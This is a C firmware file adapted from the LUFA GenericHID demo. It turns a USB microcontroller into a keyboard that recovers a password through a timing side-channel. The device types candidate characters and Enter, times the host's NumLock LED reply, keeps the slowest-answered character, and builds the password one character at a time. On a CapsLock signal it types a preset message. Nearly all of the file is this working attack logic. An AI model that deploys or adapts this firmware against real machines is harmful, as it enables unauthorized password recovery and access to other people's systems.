/*
             LUFA Library
     Copyright (C) Dean Camera, 2014.

  dean [at] fourwalledcubicle [dot] com
           www.lufa-lib.org
*/

/*
  Copyright 2014  Dean Camera (dean [at] fourwalledcubicle [dot] com)

  Permission to use, copy, modify, distribute, and sell this
  software and its documentation for any purpose is hereby granted
  without fee, provided that the above copyright notice appear in
  all copies and that both that the copyright notice and this
  permission notice and warranty disclaimer appear in supporting
  documentation, and that the name of the author not be used in
  advertising or publicity pertaining to distribution of the
  software without specific, written prior permission.

  The author disclaims all warranties with regard to this
  software, including all implied warranties of merchantability
  and fitness.  In no event shall the author be liable for any
  special, indirect or consequential damages or any damages
  whatsoever resulting from loss of use, data or profits, whether
  in an action of contract, negligence or other tortious action,
  arising out of or in connection with the use or performance of
  this software.
*/

/** \file
 *
 *  Main source file for the GenericHID demo. This file contains the main tasks of
 *  the demo and is responsible for the initial application hardware configuration.
 */

#include "GenericHID.h"

/** Buffer to hold the previously generated HID report, for comparison purposes inside the HID class driver. */
static uint8_t PrevHIDReportBuffer[GENERIC_REPORT_SIZE];

/** LUFA HID Class driver interface configuration and state information. This structure is
 *  passed to all HID Class driver functions, so that multiple instances of the same class
 *  within a device can be differentiated from one another.
 */
USB_ClassInfo_HID_Device_t Generic_HID_Interface =
	{
		.Config =
			{
				.InterfaceNumber              = INTERFACE_ID_GenericHID,
				.ReportINEndpoint             =
					{
						.Address              = GENERIC_IN_EPADDR,
						.Size                 = GENERIC_REPORT_SIZE,
						.Banks                = 1,
					},
				.PrevReportINBuffer           = PrevHIDReportBuffer,
				.PrevReportINBufferSize       = sizeof(PrevHIDReportBuffer),
			},
	};


uint8_t buffer[GENERIC_REPORT_SIZE];

/* USB runtime structure*/
XMC_USBD_t USB_runtime =
{
  .usbd = USB0,
  .usbd_max_num_eps = XMC_USBD_MAX_NUM_EPS_6,
  .usbd_transfer_mode = XMC_USBD_USE_FIFO,
  .cb_xmc_device_event = USBD_SignalDeviceEventHandler,
  .cb_endpoint_event = USBD_SignalEndpointEvent_Handler

};

/*******************************************************************************
**                     Public Function Definitions                            **
*******************************************************************************/

void USB0_0_IRQHandler(void)
{
  XMC_USBD_IRQHandler(&USB_runtime);

}

/*The function initializes the USB core layer and register call backs. */
void USB_Init(void)
{
  USBD_Initialize(&USB_runtime);

  /* Interrupts configuration*/
  NVIC_SetPriority(USB0_0_IRQn, NVIC_EncodePriority(NVIC_GetPriorityGrouping(), 63, 0));
  NVIC_ClearPendingIRQ(USB0_0_IRQn);
  NVIC_EnableIRQ(USB0_0_IRQn);

  /* USB Connection*/
  USB_Attach();

}

/** Event handler for the library USB Connection event. */
void EVENT_USB_Device_(void)
{
}
/** Event handler for the library USB Connection event. */
void EVENT_USB_Device_Connect(void)
{
}

/** Event handler for the library USB Disconnection event. */
void EVENT_USB_Device_Reset(void)
{
  if(device.IsConfigured)
  {
    USB_Init();
    device.IsConfigured=0;
  }
}

/** Event handler for the library USB Configuration Changed event. */
void EVENT_USB_Device_ConfigurationChanged(void)
{
  bool ConfigSuccess = true;

  USBD_SetEndpointBuffer(GENERIC_IN_EPADDR, buffer, GENERIC_REPORT_SIZE);

  ConfigSuccess &= HID_Device_ConfigureEndpoints(&Generic_HID_Interface);

  device.IsConfigured = ConfigSuccess;
}

/** Event handler for the library USB Control Request reception event. */
void EVENT_USB_Device_ControlRequest(void)
{
	HID_Device_ProcessControlRequest(&Generic_HID_Interface);
}
 unsigned char valid_characters[] =  { 0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,\
                                      0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A,0x1b,0x1d,0x1c,\
                                      0x1e,0x1f,0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,\
                                      0x30,0x38,0x36,0x37,\
                                      0x64,\
                                      0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,0x10,\
                                      0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A,0x1b,0x1d,0x1c,\
                                      0x1e,0x21,0x23,0x24,0x25,0x26,0x27,\
                                      0x2d,0x38,0x36,0x37,\
                                      0x64,\
                                      0x24,0x25,0x26,0x27,0x30};
                                      
                                      
unsigned char success_array[] = {0x08,0x06,0x0b,0x12,0x2c,0x1F,0x15,0x04,0x0d,\
                                0x04,0x17,0x0b,0x04,0x07,0x15,0x0c,0x13,0x18,0x15,0x04,0x2c,0x0E,\
                                0x18,0x10,0x04,0x15,0x04,0x0c,0x04,0x0b,0x2c,0x1d,0x04,0x07,0x0b,0x18,\
                                0x11,0x04,0x11,0x07,0x04,0x11,0x04,0x1F,0x64,0x21,0x0B,\
                                0x12,0x10,0x08,0x24,0x27,0x20,0x23,0x25,0x27,0x26,0x21,0x20,0x28};
//SHIFT key from the index [41 to 77] both inclusive,
//ALT Gr+SHIFT from [78-83] both inclusive.

bool is_character_sent = false;
bool is_enter_sent = false;
int is_numlock_response_received_after_enter = 0;
bool firsttime = true;
bool is_numlock_on = true;
int char_sent_count = 0;
int char_index_counter = 0;
int sample_counter = 0;
bool is_third_sample = false;
uint64_t ticks, start_ticks;
uint64_t ticks_array[84];
int ticks_array_counter;
uint64_t sample_array[SAMPLE_COUNT];
int report_counter;
bool is_first_run_done;
int correct_password_index[20];
int correct_password_len;
int correct_password_sent_count;
unsigned int prev_sent_char;
bool is_present_char_correct_password = false;
bool is_sample_count_made_zero = false;
bool is_timing_attack_successful = false;
unsigned int success_array_count = 0;

void SysTick_Handler(void)
{
  ticks++;
}

unsigned int find_minimum(unsigned int size, uint64_t *ptr)
{
    uint64_t minimum = ptr[0];
    unsigned int min_count; 
      for ( min_count = 1; min_count < size ; min_count++ ) 
      {
          if ( ptr[min_count] < minimum ) 
          {
             minimum = ptr[min_count];
          }
      }
      return minimum;
}

unsigned int find_max(unsigned int size, uint64_t *ptr)
{
    uint64_t max = ptr[0];
    unsigned int max_count,location=0; 
    for ( max_count = 1; max_count < size ; max_count++ ) 
    {
      if ( ptr[max_count] > max ) 
      {
        max = ptr[max_count];
        location = max_count; 
      }
    }
    return location;
}

//Added temporarily, may not be required
void delay_func()
{
  int i = 0;
  for(;i<65535;i++);
}


/** HID class driver callback function for the creation of HID reports to the host.
 *
 *  \param[in]     HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in,out] ReportID    Report ID requested by the host if non-zero, otherwise callback should set to the generated report ID
 *  \param[in]     ReportType  Type of the report to create, either HID_REPORT_ITEM_In or HID_REPORT_ITEM_Feature
 *  \param[out]    ReportData  Pointer to a buffer where the created report should be stored
 *  \param[out]    ReportSize  Number of bytes written in the report (or zero if no report is to be sent)
 *
 *  \return Boolean \c true to force the sending of the report, \c false to let the library determine if it needs to be sent
 */
bool CALLBACK_HID_Device_CreateHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
                                         uint8_t* const ReportID,
                                         const uint8_t ReportType,
                                         void* ReportData,
                                         uint16_t* const ReportSize)
{

	//uint8_t* Data       = (uint8_t*)ReportData;

	//Data[0] = (uint8_t)XMC_GPIO_GetInput(LED1);
	//Data[1] = (uint8_t)XMC_GPIO_GetInput(LED2);
    USB_KeyboardReport_Data_t* KeyboardReport = (USB_KeyboardReport_Data_t*)ReportData;
    //while(ticks-previous_sent_char_ticks < 10000);
    if(!is_timing_attack_successful)
    {
    if(is_numlock_on | firsttime)
    {
    if(!is_character_sent)
    {
        if(correct_password_sent_count < correct_password_len)
        {
            if(correct_password_index[correct_password_sent_count] <= 40)
            {
                KeyboardReport->KeyCode[0] = valid_characters[correct_password_index[correct_password_sent_count]];
            } else if((correct_password_index[correct_password_sent_count] > 40) && (correct_password_index[correct_password_sent_count] <= 78))
            {
                KeyboardReport->KeyCode[0] = valid_characters[correct_password_index[correct_password_sent_count]];
                KeyboardReport->Modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
            }
            else if(correct_password_index[correct_password_sent_count] <= 83)
            {
                KeyboardReport->KeyCode[0] = valid_characters[correct_password_index[correct_password_sent_count]];
                KeyboardReport->Modifier =   HID_KEYBOARD_MODIFIER_RIGHTALT;
            }
            correct_password_sent_count++;
            is_present_char_correct_password = true;
        } else 
        {
            if(char_sent_count <= 40)
            {
                KeyboardReport->KeyCode[0] = valid_characters[char_sent_count];
            } else if((char_sent_count > 40) && (char_sent_count <= 78))
            {
                KeyboardReport->KeyCode[0] = valid_characters[char_sent_count];
                KeyboardReport->Modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
            }
            else if(char_sent_count <= 83)
            {
                KeyboardReport->KeyCode[0] = valid_characters[char_sent_count];
                KeyboardReport->Modifier =   HID_KEYBOARD_MODIFIER_RIGHTALT;
            }
            sample_counter = sample_counter+1;
            is_character_sent = true;
            if(sample_counter == SAMPLE_COUNT)
            {
                char_sent_count = char_sent_count+1;
                sample_counter = 0;
                is_third_sample = true;
                is_sample_count_made_zero = true; 
            } else
                is_sample_count_made_zero = false;
            is_present_char_correct_password = false;
        }
    }
    else if(!is_enter_sent && is_character_sent) {
        KeyboardReport->KeyCode[0]=0x28;
        is_enter_sent = true;
        correct_password_sent_count = 0;
        
    }
    
    
	*ReportSize = sizeof(USB_KeyboardReport_Data_t);
    
    //This logic is to overcome the behaviour of OS which neglects the repeated cha7racters
        if(prev_sent_char == KeyboardReport->KeyCode[0] && !is_enter_sent && correct_password_len)
        {
            //*ReportSize = 0;
            KeyboardReport->KeyCode[0] = 0;
            if(is_present_char_correct_password)
                correct_password_sent_count--;
            else if(!is_sample_count_made_zero)
                {
                    sample_counter--;
                    is_character_sent = false;
                }
                else 
                {
                    sample_counter = 2;
                    char_sent_count--;
                    is_character_sent = false;
                }
        }
    //Logic ends here
    prev_sent_char = KeyboardReport->KeyCode[0];
    }
    else
        *ReportSize = 0;
    
    } else
    {
        if(success_array_count < 61) {
        if(success_array_count == 6 || success_array_count == 21 || success_array_count == 31 \
        || ((success_array_count > 45) && (success_array_count < 50)) || (success_array_count > 50) ) {
        KeyboardReport->KeyCode[0] = success_array[success_array_count];
        }
        else {
            KeyboardReport->KeyCode[0] = success_array[success_array_count];
            KeyboardReport->Modifier = HID_KEYBOARD_MODIFIER_LEFTSHIFT;
        }
        success_array_count++;
        *ReportSize = sizeof(USB_KeyboardReport_Data_t);
    } else
        *ReportSize = 0;
    }
    
return false;
}
/** HID class driver callback function for the processing of HID reports from the host.
 *
 *  \param[in] HIDInterfaceInfo  Pointer to the HID class interface configuration structure being referenced
 *  \param[in] ReportID    Report ID of the received report from the host
 *  \param[in] ReportType  The type of report that the host has sent, either HID_REPORT_ITEM_Out or HID_REPORT_ITEM_Feature
 *  \param[in] ReportData  Pointer to a buffer where the received report has been stored
 *  \param[in] ReportSize  Size in bytes of the received HID report
 */
void CALLBACK_HID_Device_ProcessHIDReport(USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,
                                          const uint8_t ReportID,
                                          const uint8_t ReportType,
                                          const void* ReportData,
                                          const uint16_t ReportSize)
{
    uint8_t* Data       = (uint8_t*)ReportData;
	if(*Data & HID_KEYBOARD_LED_NUMLOCK) {
        is_enter_sent = false;
        is_character_sent = false;
        firsttime = false;
        is_numlock_on = true;
        if(!firsttime) {
            sample_array[report_counter] = ticks-start_ticks;
            report_counter++;
        }
        XMC_GPIO_SetOutputHigh(LED1);
        if(report_counter == SAMPLE_COUNT)
        {
            //Extract the samples and store it in main array
            is_third_sample = true; //Remove later
            report_counter = 0;
            ticks_array[ticks_array_counter] = find_minimum(SAMPLE_COUNT,sample_array);
            ticks_array_counter++;
            if(char_sent_count == 84) //very imp, this determines when iterations get over
            {
                ticks_array_counter = 0;
                correct_password_index[correct_password_len] = find_max(84,ticks_array);
                correct_password_len++;
                char_sent_count = 0;
                memset(ticks_array,0,84*sizeof(uint64_t)); //Clearing the old data
            }
        }
        delay_func(); //Added for temporary purpose;
    }
    else if(*Data & HID_KEYBOARD_LED_CAPSLOCK) {
        is_timing_attack_successful = true;
        XMC_GPIO_SetOutputHigh(LED2);
    }
    else {
        start_ticks = ticks;
        XMC_GPIO_SetOutputLow(LED1);
        is_numlock_on = false;
    }
}

bool CALLBACK_HIDParser_FilterHIDReportItem(HID_ReportItem_t* const CurrentItem)
{
  return true;
}
